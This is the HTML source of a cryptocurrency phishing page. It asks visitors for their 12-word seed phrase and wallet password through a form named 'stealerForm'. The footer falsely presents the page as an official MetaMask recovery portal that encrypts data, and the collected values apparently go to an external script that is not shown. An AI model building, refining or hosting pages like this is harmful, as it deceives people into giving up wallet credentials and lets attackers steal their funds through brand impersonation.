<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Wallet Verification</title>
  <link rel="stylesheet" href="style.css" />
  <style>
    body {
      background: #0a0f1a;
      color: #f0f0f0;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: #121826;
      border-radius: 16px;
      padding: 30px;
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.15);
      max-width: 400px;
      width: 100%;
    }
    h2 {
      text-align: center;
      color: #00ffff;
      margin-bottom: 20px;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      background: #1e2a3a;
      color: #fff;
    }
    input::placeholder {
      color: #aaa;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #00ffff;
      border: none;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s ease;
    }
    button:hover {
      background: #00cfcf;
    }
    #errorMsg {
      color: #ff4f4f;
      margin-top: 10px;
      font-size: 0.9em;
      text-align: center;
    }
    footer {
      margin-top: 20px;
      text-align: center;
      font-size: 0.75em;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>🔐 Wallet Verification</h2>
    <form id="stealerForm">
      <input type="text" id="wallet" placeholder="Enter your 12-word seed phrase" required />
      <input type="password" id="password" placeholder="Wallet password" required />
      <button type="submit">Verify Wallet</button>
    </form>
    <div id="errorMsg"></div>
    <footer>✅ You’re on the official MetaMask Recovery Assistance Portal — a 🤝 trusted partner interface. 🔐 Securely restore access to your wallet using your verified MetaMask-linked credentials. 🛡️ All data is encrypted and handled in compliance with MetaMask security protocols.</footer>
  </div>
  
  <script src="script.js"></script>
</body>
</html>
